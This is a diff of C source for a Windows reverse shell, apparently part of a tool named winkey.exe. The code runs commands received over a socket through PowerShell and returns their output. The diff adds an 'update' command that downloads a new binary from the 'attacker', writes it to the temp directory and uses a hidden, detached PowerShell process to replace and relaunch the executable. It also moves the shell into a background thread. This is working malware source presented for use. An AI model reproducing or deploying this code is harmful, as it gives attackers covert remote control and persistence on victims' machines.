@@ -5,7 +5,7 @@
 #include <ws2tcpip.h>
 #include <windows.h>
 
-void reverse_shell(void)
+DWORD WINAPI    reverse_shell(LPVOID arg)
 {
     printf("Program started...\n");
 
@@ -14,7 +14,7 @@ void reverse_shell(void)
     if (wsastart != 0)
     {
         printf("WSAStartup failed\n");
-        return;
+        return (1);
     }
     else
         printf("WSAStartup Success...\n");
@@ -56,18 +56,19 @@ void reverse_shell(void)
         // Read byte by byte until \n
         int i = 0;
         char c;
-        int recv_status = 1; 
-        while (i < (int)sizeof(incominginstructions) - 1) {
+        int recv_status = 1;
+        while (i < (int)sizeof(incominginstructions) - 1)
+        {
             recv_status = recv(outgoingsock, &c, 1, 0);
             if (recv_status <= 0) break;
             if (c == '\n') break;
             incominginstructions[i++] = c;
         }
 
-        if (recv_status <= 0)  // ← now in scope, works correctly
+        if (recv_status <= 0)
             break;
 
-        // Null terminate at actual received length (not hardcoded index)
+        // Null terminate
         incominginstructions[i] = '\0';
 
         // Strip trailing \r if client sent \r\n
@@ -77,17 +78,131 @@ void reverse_shell(void)
         if (_stricmp(incominginstructions, "exit") == 0)
             break;
 
-        // Build the powershell command string
+        // ────────────────────────────────────────────────────────────
+        // UPDATE COMMAND
+        // Flow:
+        //   1. Receive file size (4 bytes little-endian)
+        //   2. Receive binary data
+        //   3. Write to temp file
+        //   4. Spawn detached PowerShell helper that will:
+        //        - wait 2s (so winkey.exe has time to exit)
+        //        - replace winkey.exe on disk
+        //        - relaunch winkey.exe
+        //   5. Notify attacker, close socket, exit thread
+        //      → winkey.exe dies, helper takes over
+        //      → new winkey.exe reconnects automatically via retry loop
+        // ────────────────────────────────────────────────────────────
+        if (_stricmp(incominginstructions, "update") == 0)
+        {
+            // 1. Receive file size (4 bytes)
+            unsigned int filesize = 0;
+            int r = recv(outgoingsock, (char*)&filesize, sizeof(filesize), MSG_WAITALL);
+            if (r <= 0 || filesize == 0 || filesize > 50 * 1024 * 1024)
+            {
+                char *err = "update: bad file size\n> ";
+                send(outgoingsock, err, strlen(err), 0);
+                continue;
+            }
+
+            // 2. Receive binary data
+            char *newbinary = malloc(filesize);
+            if (!newbinary)
+            {
+                char *err = "update: malloc failed\n> ";
+                send(outgoingsock, err, strlen(err), 0);
+                continue;
+            }
+
+            unsigned int received = 0;
+            while (received < filesize)
+            {
+                int chunk = recv(outgoingsock, newbinary + received, filesize - received, 0);
+                if (chunk <= 0) break;
+                received += (unsigned int)chunk;
+            }
+
+            if (received != filesize)
+            {
+                free(newbinary);
+                char *err = "update: incomplete transfer\n> ";
+                send(outgoingsock, err, strlen(err), 0);
+                continue;
+            }
+
+            // 3. Write to temp file
+            char tmppath[MAX_PATH];
+            GetTempPathA(MAX_PATH, tmppath);
+            strncat(tmppath, "winkey_new.exe", MAX_PATH - strlen(tmppath) - 1);
+
+            FILE *f = fopen(tmppath, "wb");
+            if (!f)
+            {
+                free(newbinary);
+                char *err = "update: fopen failed\n> ";
+                send(outgoingsock, err, strlen(err), 0);
+                continue;
+            }
+            fwrite(newbinary, 1, filesize, f);
+            fclose(f);
+            free(newbinary);
+
+            // 4. Find winkey.exe path (same directory as current binary)
+            char winkey_path[MAX_PATH];
+            GetModuleFileNameA(NULL, winkey_path, MAX_PATH);
+            char *last_slash = strrchr(winkey_path, '\\');
+            if (last_slash)
+                strcpy(last_slash + 1, "winkey.exe");
+
+            // 5. Spawn detached PowerShell helper
+            //    It waits 2s (winkey dies), replaces binary, relaunches
+            char ps_update[MAX_PATH * 4];
+            snprintf(ps_update, sizeof(ps_update),
+                "powershell.exe -NoProfile -WindowStyle Hidden -Command \""
+                "Start-Sleep 2; "
+                "Move-Item -Force '%s' '%s'; "
+                "Start-Process '%s'"
+                "\"",
+                tmppath,
+                winkey_path,
+                winkey_path
+            );
+
+            printf("%s %s\n", tmppath, winkey_path);
+
+            STARTUPINFOA si2;
+            PROCESS_INFORMATION pi2;
+            ZeroMemory(&si2, sizeof(si2));
+            ZeroMemory(&pi2, sizeof(pi2));
+            si2.cb = sizeof(si2);
+
+            CreateProcessA(NULL, ps_update, NULL, NULL, FALSE,
+                           CREATE_NO_WINDOW | DETACHED_PROCESS,
+                           NULL, NULL, &si2, &pi2);
+            CloseHandle(pi2.hProcess);
+            CloseHandle(pi2.hThread);
+
+            // Notify attacker then die cleanly
+            char *ok = "update: binary received, reconnect in ~5s...\n";
+            send(outgoingsock, ok, strlen(ok), 0);
+
+            closesocket(outgoingsock);
+            WSACleanup();
+            ExitProcess(0);
+        }
+
+        // ────────────────────────────────────────────────────────────
+        // NORMAL COMMAND — wrap in PowerShell and pipe output back
+        // ────────────────────────────────────────────────────────────
+
         char pscommand[2300];
         snprintf(pscommand, sizeof(pscommand),
             "powershell.exe -NoProfile -NonInteractive -Command \"%s\"",
             incominginstructions);
 
-        // Set up pipe for reading child process stdout/stderr
         HANDLE hReadPipe, hWritePipe;
         SECURITY_ATTRIBUTES sa;
-        sa.nLength = sizeof(SECURITY_ATTRIBUTES);
-        sa.bInheritHandle = TRUE;
+        sa.nLength              = sizeof(SECURITY_ATTRIBUTES);
+        sa.bInheritHandle       = TRUE;
         sa.lpSecurityDescriptor = NULL;
 
         if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
@@ -96,10 +211,8 @@ void reverse_shell(void)
             continue;
         }
 
-        // Read end should not be inherited by child
         SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);
 
-        // Configure child process to use pipe as stdout and stderr
         STARTUPINFO si;
         PROCESS_INFORMATION pi;
         ZeroMemory(&si, sizeof(si));
@@ -110,7 +223,8 @@ void reverse_shell(void)
         si.hStdError  = hWritePipe;
         si.hStdInput  = INVALID_HANDLE_VALUE;
 
-        if (!CreateProcess(NULL, pscommand, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
+        if (!CreateProcess(NULL, pscommand, NULL, NULL, TRUE,
+                           CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
         {
             printf("CreateProcess failed, error %lu\n", GetLastError());
             CloseHandle(hReadPipe);
@@ -118,10 +232,8 @@ void reverse_shell(void)
             continue;
         }
 
-        // Close the write end in the parent or ReadFile will never return
         CloseHandle(hWritePipe);
 
-        // Read all output from the pipe
         char outgoingoutp[8000];
         int total = 0;
         DWORD bytesRead;
@@ -146,7 +258,6 @@ void reverse_shell(void)
             total = strlen(outgoingoutp);
         }
 
-        // Send all output back over the socket
         int total_sent = 0;
         while (total_sent < total)
         {
@@ -161,5 +272,26 @@ void reverse_shell(void)
 
     closesocket(outgoingsock);
     WSACleanup();
-    return;
+    return (0);
+}
+
+
+void    start_reverse_shell(void)
+{
+    HANDLE h = CreateThread(
+        NULL,
+        0,
+        reverse_shell,
+        NULL,
+        0,
+        NULL
+    );
+
+    if (h == NULL)
+    {
+        fprintf(stderr, "CreateThread failed\n");
+        return;
+    }
+
+    CloseHandle(h);
 }
